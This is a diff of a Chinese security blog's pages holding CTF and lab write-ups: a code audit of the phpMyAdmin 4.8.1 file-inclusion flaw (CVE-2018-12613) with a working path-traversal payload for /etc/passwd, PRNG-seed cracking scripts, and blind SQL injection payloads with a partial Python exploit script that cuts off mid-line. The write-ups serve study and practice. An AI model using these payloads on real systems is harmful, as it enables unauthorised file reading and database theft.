&#125;</span><br></pre></td></tr></table></figure><br>看见这个函数需要两个参数，如果whitelist参数为空，会使用代码提供的白名单数组，追踪一下这个数组：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line">public static $goto_whitelist &#x3D; array(</span><br><span class="line">        &#39; db_datadict.php&#39;,</span><br><span class="line">        &#39;db_sql.php&#39;,</span><br><span class="line">        &#39;db_events.php&#39;,</span><br><span class="line">        &#39;db_export.php&#39;,</span><br><span class="line">        &#39;db_importdocsql.php&#39;,</span><br><span class="line">        &#39;db_multi_table_query.php&#39;,</span><br><span class="line">        &#39;db_structure.php&#39;,</span><br><span class="line">        &#39;db_import.php&#39;,</span><br><span class="line">        &#39;db_operations.php&#39;,</span><br><span class="line">        &#39;db_search.php&#39;,</span><br><span class="line">        &#39;db_routines.php&#39;,</span><br><span class="line">        &#39;export.php&#39;,</span><br><span class="line">        &#39;import.php&#39;,</span><br><span class="line">        &#39;index.php&#39;,</span><br><span class="line">        &#39;pdf_pages.php&#39;,</span><br><span class="line">        &#39;pdf_schema.php&#39;,</span><br><span class="line">        &#39;server_binlog.php&#39;,</span><br><span class="line">        &#39;server_collations.php&#39;,</span><br><span class="line">        &#39;server_databases.php&#39;,</span><br><span class="line">        &#39;server_engines.php&#39;,</span><br><span class="line">        &#39;server_export.php&#39;,</span><br><span class="line">        &#39;server_import.php&#39;,</span><br><span class="line">        &#39;server_privileges.php&#39;,</span><br><span class="line">        &#39;server_sql.php&#39;,</span><br><span class="line">        &#39;server_status.php&#39;,</span><br><span class="line">        &#39;server_status_advisor.php&#39;,</span><br><span class="line">        &#39;server_status_monitor.php&#39;,</span><br><span class="line">        &#39;server_status_queries.php&#39;,</span><br><span class="line">        &#39;server_status_variables.php&#39;,</span><br><span class="line">        &#39;server_variables.php&#39;,</span><br><span class="line">        &#39;sql.php&#39;,</span><br><span class="line">        &#39;tbl_addfield.php&#39;,</span><br><span class="line">        &#39;tbl_change.php&#39;,</span><br><span class="line">        &#39;tbl_create.php&#39;,</span><br><span class="line">        &#39;tbl_import.php&#39;,</span><br><span class="line">        &#39;tbl_indexes.php&#39;,</span><br><span class="line">        &#39;tbl_sql.php&#39;,</span><br><span class="line">        &#39;tbl_export.php&#39;,</span><br><span class="line">        &#39;tbl_operations.php&#39;,</span><br><span class="line">        &#39;tbl_structure.php&#39;,</span><br><span class="line">        &#39;tbl_relation.php&#39;,</span><br><span class="line">        &#39;tbl_replace.php&#39;,</span><br><span class="line">        &#39;tbl_row_action.php&#39;,</span><br><span class="line">        &#39;tbl_select.php&#39;,</span><br><span class="line">        &#39;tbl_zoom_select.php&#39;,</span><br><span class="line">        &#39;transformation_overview.php&#39;,</span><br><span class="line">        &#39;transformation_wrapper.php&#39;,</span><br><span class="line">        &#39;user_password.php&#39;,</span><br><span class="line">    );</span><br></pre></td></tr></table></figure><br>看一下这段代码的逻辑：就是target参数问号前面的要在白名单里会返回true。<br>看一下这段代码：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">   $_page &#x3D; urldecode($page);</span><br><span class="line">        $_page &#x3D; mb_substr(</span><br><span class="line">            $_page,</span><br><span class="line">            0,</span><br><span class="line">            mb_strpos($_page . &#39;?&#39;, &#39;?&#39;)</span><br><span class="line">        );</span><br><span class="line">        if (in_array($_page, $whitelist)) &#123;</span><br><span class="line">            return true;</span><br><span class="line">        &#125;</span><br><span class="line">        return false;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><br>这段代码是将参数url解码一下，所以在浏览器中我们要双重url编码，因为在传入服务器之前会先进行一次url解码。<br>根据我们上面的分析很容易写出payload:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">http:&#x2F;&#x2F;your-ip:8080&#x2F;index.php?target&#x3D;db_sql.php%253f&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;etc&#x2F;passwd</span><br></pre></td></tr></table></figure><br>我试了不url编码?的payload，但是没有成功。<br>最后直接通过这段payload获取到了我事先写好的一个flag.txt文件内容：<br><img src="/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-phpmyadmin4-8-1%E5%90%8E%E5%8F%B0%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E-CVE-2018-12613/1.png" class title="Da4er"></p>
-
+            <script type="text/javascript" src="/js/src/bai.js"></script>
+<p>漏洞影响范围：phpmyadmin4.8.0 4.8.1<br>漏洞类型：后台任意文件包含<br><a href="https://files.phpmyadmin.net/phpMyAdmin/4.8.1/phpMyAdmin-4.8.1-all-languages.zip">下载地址</a></p>
+<p>漏洞出现在index.php页面中的55~63行</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">if (! empty($_REQUEST[&#39;target&#39;])</span><br><span class="line">    &amp;&amp; is_string($_REQUEST[&#39;target&#39;])</span><br><span class="line">    &amp;&amp; ! preg_match(&#39;&#x2F;^index&#x2F;&#39;, $_REQUEST[&#39;target&#39;])</span><br><span class="line">    &amp;&amp; ! in_array($_REQUEST[&#39;target&#39;], $target_blacklist)</span><br><span class="line">    &amp;&amp; Core::checkPageValidity($_REQUEST[&#39;target&#39;])</span><br><span class="line">) &#123;</span><br><span class="line">    include $_REQUEST[&#39;target&#39;];</span><br><span class="line">    exit;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>看这个段代码的逻辑：传入的target参数不为空；target是字符串类型；target不易index开头；target不在$target_blacklist中；checkPageValidity($_REQUEST[‘target’]返回true。</p>
+<p>看一下$target_blacklist：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$target_blacklist &#x3D; array (</span><br><span class="line">    &#39;import.php&#39;, &#39;export.php&#39;</span><br><span class="line">);</span><br></pre></td></tr></table></figure>
+<p>追踪一下checkPageValidity函数：在/libraries/classes/Core.php中找到，代码如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">public static function checkPageValidity(&amp;$page, array </span><br><span class="line">$whitelist &#x3D; [])</span><br><span class="line"></span><br><span class="line">    &#123;</span><br><span class="line">       if (empty($whitelist)) &#123;</span><br><span class="line">            $whitelist &#x3D; self::$goto_whitelist;</span><br><span class="line">        &#125;</span><br><span class="line">       if (! isset($page) || !is_string($page)) &#123;</span><br><span class="line">            return false;</span><br><span class="line">        &#125;</span><br><span class="line">        if (in_array($page, $whitelist)) &#123;</span><br><span class="line">            return true;</span><br><span class="line">        &#125;</span><br><span class="line">        $_page &#x3D; mb_substr(</span><br><span class="line">           $page,</span><br><span class="line">            0,</span><br><span class="line">            mb_strpos($page . &#39;?&#39;, &#39;?&#39;)</span><br><span class="line">        );</span><br><span class="line">        if (in_array($_page, $whitelist)) &#123;</span><br><span class="line">            return true;</span><br><span class="line">        &#125;</span><br><span class="line">        $_page &#x3D; urldecode($page);</span><br><span class="line">        $_page &#x3D; mb_substr(</span><br><span class="line">            $_page,</span><br><span class="line">            0,</span><br><span class="line">            mb_strpos($_page . &#39;?&#39;, &#39;?&#39;)</span><br><span class="line">        );</span><br><span class="line">        if (in_array($_page, $whitelist)) &#123;</span><br><span class="line">            return true;</span><br><span class="line">        &#125;</span><br><span class="line">        return false;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+<p>看见这个函数需要两个参数，如果whitelist参数为空，会使用代码提供的白名单数组，追踪一下这个数组：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line">public static $goto_whitelist &#x3D; array(</span><br><span class="line">        &#39; db_datadict.php&#39;,</span><br><span class="line">        &#39;db_sql.php&#39;,</span><br><span class="line">        &#39;db_events.php&#39;,</span><br><span class="line">        &#39;db_export.php&#39;,</span><br><span class="line">        &#39;db_importdocsql.php&#39;,</span><br><span class="line">        &#39;db_multi_table_query.php&#39;,</span><br><span class="line">        &#39;db_structure.php&#39;,</span><br><span class="line">        &#39;db_import.php&#39;,</span><br><span class="line">        &#39;db_operations.php&#39;,</span><br><span class="line">        &#39;db_search.php&#39;,</span><br><span class="line">        &#39;db_routines.php&#39;,</span><br><span class="line">        &#39;export.php&#39;,</span><br><span class="line">        &#39;import.php&#39;,</span><br><span class="line">        &#39;index.php&#39;,</span><br><span class="line">        &#39;pdf_pages.php&#39;,</span><br><span class="line">        &#39;pdf_schema.php&#39;,</span><br><span class="line">        &#39;server_binlog.php&#39;,</span><br><span class="line">        &#39;server_collations.php&#39;,</span><br><span class="line">        &#39;server_databases.php&#39;,</span><br><span class="line">        &#39;server_engines.php&#39;,</span><br><span class="line">        &#39;server_export.php&#39;,</span><br><span class="line">        &#39;server_import.php&#39;,</span><br><span class="line">        &#39;server_privileges.php&#39;,</span><br><span class="line">        &#39;server_sql.php&#39;,</span><br><span class="line">        &#39;server_status.php&#39;,</span><br><span class="line">        &#39;server_status_advisor.php&#39;,</span><br><span class="line">        &#39;server_status_monitor.php&#39;,</span><br><span class="line">        &#39;server_status_queries.php&#39;,</span><br><span class="line">        &#39;server_status_variables.php&#39;,</span><br><span class="line">        &#39;server_variables.php&#39;,</span><br><span class="line">        &#39;sql.php&#39;,</span><br><span class="line">        &#39;tbl_addfield.php&#39;,</span><br><span class="line">        &#39;tbl_change.php&#39;,</span><br><span class="line">        &#39;tbl_create.php&#39;,</span><br><span class="line">        &#39;tbl_import.php&#39;,</span><br><span class="line">        &#39;tbl_indexes.php&#39;,</span><br><span class="line">        &#39;tbl_sql.php&#39;,</span><br><span class="line">        &#39;tbl_export.php&#39;,</span><br><span class="line">        &#39;tbl_operations.php&#39;,</span><br><span class="line">        &#39;tbl_structure.php&#39;,</span><br><span class="line">        &#39;tbl_relation.php&#39;,</span><br><span class="line">        &#39;tbl_replace.php&#39;,</span><br><span class="line">        &#39;tbl_row_action.php&#39;,</span><br><span class="line">        &#39;tbl_select.php&#39;,</span><br><span class="line">        &#39;tbl_zoom_select.php&#39;,</span><br><span class="line">        &#39;transformation_overview.php&#39;,</span><br><span class="line">        &#39;transformation_wrapper.php&#39;,</span><br><span class="line">        &#39;user_password.php&#39;,</span><br><span class="line">    );</span><br></pre></td></tr></table></figure>
+<p>看一下这段代码的逻辑：就是target参数问号前面的要在白名单里会返回true。<br>看一下这段代码：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">   $_page &#x3D; urldecode($page);</span><br><span class="line">        $_page &#x3D; mb_substr(</span><br><span class="line">            $_page,</span><br><span class="line">            0,</span><br><span class="line">            mb_strpos($_page . &#39;?&#39;, &#39;?&#39;)</span><br><span class="line">        );</span><br><span class="line">        if (in_array($_page, $whitelist)) &#123;</span><br><span class="line">            return true;</span><br><span class="line">        &#125;</span><br><span class="line">        return false;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+<p>这段代码是将参数url解码一下，所以在浏览器中我们要双重url编码，因为在传入服务器之前会先进行一次url解码。<br>根据我们上面的分析很容易写出payload:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">http:&#x2F;&#x2F;your-ip:8080&#x2F;index.php?target&#x3D;db_sql.php%253f&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;etc&#x2F;passwd</span><br></pre></td></tr></table></figure>
+<p>我试了不url编码?的payload，但是没有成功。<br>最后直接通过这段payload获取到了我事先写好的一个flag.txt文件内容：</p>
+<img src="/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-phpmyadmin4-8-1%E5%90%8E%E5%8F%B0%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E-CVE-2018-12613/1.png" class title="Da4er">
         </div>
         
         
@@ -557,7 +603,7 @@
                 <span class="level-item has-text-grey">
                     
                     
-                    2 minutes lesen (Über 305 Worte)
+                    2 minutes leer (Acerca de 305 palabras)
                 </span>
                 
                 
@@ -570,11 +616,25 @@
             
         </h1>
         <div class="content">
-            <p><script type="text/javascript" src="/js/src/bai.js"></script></p>
-<h3 id="枯燥的抽奖"><a href="#枯燥的抽奖" class="headerlink" title="枯燥的抽奖"></a>枯燥的抽奖</h3><p>打开页面发现是给出了前十位，要猜后十位的字符串。直接抓包发现check.php源码<br><img src="/2-17-GWCTF-2019-%E6%9E%AF%E7%87%A5%E7%9A%84%E6%8A%BD%E5%A5%96-%E6%88%91%E6%9C%89%E4%B8%80%E4%B8%AA%E6%95%B0%E6%8D%AE%E5%BA%93/1.png" class title="Da4er"><br><img src="/2-17-GWCTF-2019-%E6%9E%AF%E7%87%A5%E7%9A%84%E6%8A%BD%E5%A5%96-%E6%88%91%E6%9C%89%E4%B8%80%E4%B8%AA%E6%95%B0%E6%8D%AE%E5%BA%93/2.png" class title="Da4er"><br>看到是个伪随机数问题，使用php_mt_seed进行爆破。<br>首先使用下面这个脚本，把php_mt_seed需要的获取出来：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">str1&#x3D;&#39;abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ&#39;</span><br><span class="line">str2&#x3D;&#39;hvKiZfOpgL&#39; &#x2F;&#x2F;这里填上题目给的前十位</span><br><span class="line">str3 &#x3D; str1[::-1]</span><br><span class="line">length &#x3D; len(str2)</span><br><span class="line">res&#x3D;&#39;&#39;</span><br><span class="line">for i in range(len(str2)):</span><br><span class="line">    for j in range(len(str1)):</span><br><span class="line">        if str2[i] &#x3D;&#x3D; str1[j]:</span><br><span class="line">            res+&#x3D;str(j)+&#39; &#39;+str(j)+&#39; &#39;+&#39;0&#39;+&#39; &#39;+str(len(str1)-1)+&#39; &#39;</span><br><span class="line">            break</span><br><span class="line">print(res)</span><br></pre></td></tr></table></figure><br><img src="/2-17-GWCTF-2019-%E6%9E%AF%E7%87%A5%E7%9A%84%E6%8A%BD%E5%A5%96-%E6%88%91%E6%9C%89%E4%B8%80%E4%B8%AA%E6%95%B0%E6%8D%AE%E5%BA%93/3.png" class title="Da4er"><br>然后用php_mt_seed爆破：<br><img src="/2-17-GWCTF-2019-%E6%9E%AF%E7%87%A5%E7%9A%84%E6%8A%BD%E5%A5%96-%E6%88%91%E6%9C%89%E4%B8%80%E4%B8%AA%E6%95%B0%E6%8D%AE%E5%BA%93/4.png" class title="Da4er"><br>得到的随机数直接用下面的脚本进行获取全面字符串：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">mt_srand(104517409);</span><br><span class="line">$str_long1 &#x3D; </span><br><span class="line">&quot;abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;;</span><br><span class="line">$str &#x3D; &#39;&#39;;</span><br><span class="line">$len1 &#x3D; 20;</span><br><span class="line">for ($i &#x3D; 0; $i &lt; $len1; $i++) </span><br><span class="line">&#123;    $str .&#x3D; substr($str_long1, mt_rand(0, strlen($str_long1) - 1), 1);</span><br><span class="line">&#125;</span><br><span class="line">echo &quot;&lt;p id&#x3D;&#39;p1&#39;&gt;&quot; . $str . &quot;&lt;&#x2F;p&gt;&quot;;</span><br></pre></td></tr></table></figure><br><img src="/2-17-GWCTF-2019-%E6%9E%AF%E7%87%A5%E7%9A%84%E6%8A%BD%E5%A5%96-%E6%88%91%E6%9C%89%E4%B8%80%E4%B8%AA%E6%95%B0%E6%8D%AE%E5%BA%93/5.png" class title="Da4er"><br>将这段字符串提交得到flag。<br><img src="/2-17-GWCTF-2019-%E6%9E%AF%E7%87%A5%E7%9A%84%E6%8A%BD%E5%A5%96-%E6%88%91%E6%9C%89%E4%B8%80%E4%B8%AA%E6%95%B0%E6%8D%AE%E5%BA%93/6.png" class title="Da4er"></p>
-<hr>
-<h3 id="我有一个数据库"><a href="#我有一个数据库" class="headerlink" title="我有一个数据库"></a>我有一个数据库</h3><p>目录扫描到phpmyadmin，接下来的就没思路了，看了别的师傅的wp，发现是phpmyadmin有一处文件包含：phpMyadmin(CVE-2018-12613)后台任意文件包含漏洞。<br>payload：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">phpmyadmin&#x2F;?target&#x3D;db_datadict.php%253f&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;flag</span><br></pre></td></tr></table></figure><br><img src="/2-17-GWCTF-2019-%E6%9E%AF%E7%87%A5%E7%9A%84%E6%8A%BD%E5%A5%96-%E6%88%91%E6%9C%89%E4%B8%80%E4%B8%AA%E6%95%B0%E6%8D%AE%E5%BA%93/7.png" class title="Da4er"></p>
+            <script type="text/javascript" src="/js/src/bai.js"></script>
+<h3 id="枯燥的抽奖"><a href="#枯燥的抽奖" class="headerlink" title="枯燥的抽奖"></a>枯燥的抽奖</h3><p>打开页面发现是给出了前十位，要猜后十位的字符串。直接抓包发现check.php源码</p>
+<img src="/2-17-GWCTF-2019-%E6%9E%AF%E7%87%A5%E7%9A%84%E6%8A%BD%E5%A5%96-%E6%88%91%E6%9C%89%E4%B8%80%E4%B8%AA%E6%95%B0%E6%8D%AE%E5%BA%93/1.png" class title="Da4er">
+<img src="/2-17-GWCTF-2019-%E6%9E%AF%E7%87%A5%E7%9A%84%E6%8A%BD%E5%A5%96-%E6%88%91%E6%9C%89%E4%B8%80%E4%B8%AA%E6%95%B0%E6%8D%AE%E5%BA%93/2.png" class title="Da4er">
+<p>看到是个伪随机数问题，使用php_mt_seed进行爆破。<br>首先使用下面这个脚本，把php_mt_seed需要的获取出来：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">str1&#x3D;&#39;abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ&#39;</span><br><span class="line">str2&#x3D;&#39;hvKiZfOpgL&#39; &#x2F;&#x2F;这里填上题目给的前十位</span><br><span class="line">str3 &#x3D; str1[::-1]</span><br><span class="line">length &#x3D; len(str2)</span><br><span class="line">res&#x3D;&#39;&#39;</span><br><span class="line">for i in range(len(str2)):</span><br><span class="line">    for j in range(len(str1)):</span><br><span class="line">        if str2[i] &#x3D;&#x3D; str1[j]:</span><br><span class="line">            res+&#x3D;str(j)+&#39; &#39;+str(j)+&#39; &#39;+&#39;0&#39;+&#39; &#39;+str(len(str1)-1)+&#39; &#39;</span><br><span class="line">            break</span><br><span class="line">print(res)</span><br></pre></td></tr></table></figure>
+<img src="/2-17-GWCTF-2019-%E6%9E%AF%E7%87%A5%E7%9A%84%E6%8A%BD%E5%A5%96-%E6%88%91%E6%9C%89%E4%B8%80%E4%B8%AA%E6%95%B0%E6%8D%AE%E5%BA%93/3.png" class title="Da4er">
+<p>然后用php_mt_seed爆破：</p>
+<img src="/2-17-GWCTF-2019-%E6%9E%AF%E7%87%A5%E7%9A%84%E6%8A%BD%E5%A5%96-%E6%88%91%E6%9C%89%E4%B8%80%E4%B8%AA%E6%95%B0%E6%8D%AE%E5%BA%93/4.png" class title="Da4er">
+<p>得到的随机数直接用下面的脚本进行获取全面字符串：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">mt_srand(104517409);</span><br><span class="line">$str_long1 &#x3D; </span><br><span class="line">&quot;abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;;</span><br><span class="line">$str &#x3D; &#39;&#39;;</span><br><span class="line">$len1 &#x3D; 20;</span><br><span class="line">for ($i &#x3D; 0; $i &lt; $len1; $i++) </span><br><span class="line">&#123;    $str .&#x3D; substr($str_long1, mt_rand(0, strlen($str_long1) - 1), 1);</span><br><span class="line">&#125;</span><br><span class="line">echo &quot;&lt;p id&#x3D;&#39;p1&#39;&gt;&quot; . $str . &quot;&lt;&#x2F;p&gt;&quot;;</span><br></pre></td></tr></table></figure>
+<img src="/2-17-GWCTF-2019-%E6%9E%AF%E7%87%A5%E7%9A%84%E6%8A%BD%E5%A5%96-%E6%88%91%E6%9C%89%E4%B8%80%E4%B8%AA%E6%95%B0%E6%8D%AE%E5%BA%93/5.png" class title="Da4er">
+<p>将这段字符串提交得到flag。</p>
+<img src="/2-17-GWCTF-2019-%E6%9E%AF%E7%87%A5%E7%9A%84%E6%8A%BD%E5%A5%96-%E6%88%91%E6%9C%89%E4%B8%80%E4%B8%AA%E6%95%B0%E6%8D%AE%E5%BA%93/6.png" class title="Da4er">
 
+<hr>
+<h3 id="我有一个数据库"><a href="#我有一个数据库" class="headerlink" title="我有一个数据库"></a>我有一个数据库</h3><p>目录扫描到phpmyadmin，接下来的就没思路了，看了别的师傅的wp，发现是phpmyadmin有一处文件包含：phpMyadmin(CVE-2018-12613)后台任意文件包含漏洞。<br>payload：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">phpmyadmin&#x2F;?target&#x3D;db_datadict.php%253f&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;flag</span><br></pre></td></tr></table></figure>
+<img src="/2-17-GWCTF-2019-%E6%9E%AF%E7%87%A5%E7%9A%84%E6%8A%BD%E5%A5%96-%E6%88%91%E6%9C%89%E4%B8%80%E4%B8%AA%E6%95%B0%E6%8D%AE%E5%BA%93/7.png" class title="Da4er">
         </div>
         
         
@@ -607,7 +667,7 @@
                 <span class="level-item has-text-grey">
                     
                     
-                    4 minutes lesen (Über 531 Worte)
+                    4 minutes leer (Acerca de 531 palabras)
                 </span>
                 
                 
@@ -620,7 +680,14 @@
             
         </h1>
         <div class="content">
-            <p>检测通过测试发现在search.php页面存在sql注入。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">1^(ord(substr((select(group_concat(schema_name))from(information_schema.schema ta)),%d,1))&#x3D;%d)^1&quot;%(i,ord(j)) 获取数据库名称 </span><br><span class="line"></span><br><span class="line">1^(ord(substr((select(group_concat(table_name))from(information_schema.tables) where(table_schema)&#x3D;&#39;geek&#39;),%d,1))&#x3D;%d)^1&quot;%(i,ord(j)) 获取数据库表名 </span><br><span class="line"></span><br><span class="line">1^(ord(substr((select(group_concat(column_name))from(information_schema.column s)where(table_name&#x3D;&#39;F1naI1y&#39;)),%d,1))&#x3D;%d)^1&quot;%(i,ord(j)) 获取数据库列名</span><br></pre></td></tr></table></figure><br>先写个判断数据库名的脚本：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">import requests</span><br><span class="line">def database_len():</span><br><span class="line">    for i in range(9999):</span><br><span class="line">        url&#x3D;&#39;&#39;&#39;http:&#x2F;&#x2F;e383c445-91e1-4760-ae8f-4b889943e40c.node3.buuoj.cn&#x2F;search.php?id&#x3D;1&#39;&#39;&#39;</span><br><span class="line">        payload&#x3D;&#39;&#39;&#39;?id&#x3D;1&#39;^and length(database())&gt;%s&#39;&#39;&#39; %i</span><br><span class="line">        #print(url+payload+&#39; --+ &#39;)</span><br><span class="line">        r&#x3D;requests.get(url+payload+&#39; --+ &#39;)</span><br><span class="line">        if &#39;NO! Not this! Click others~~~&#39; in r.text:</span><br><span class="line">            print(i)</span><br><span class="line">        else:</span><br><span class="line">            print(&#39;database_length:&#39;,i)</span><br><span class="line">            break</span><br><span class="line">#database_len()</span><br><span class="line">def database_name():</span><br><span class="line">    databasename&#x3D;&#39;&#39;</span><br><span class="line">    for i in range(1,9):</span><br><span class="line">        for j in &#39;0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz&#39;:</span><br><span class="line">            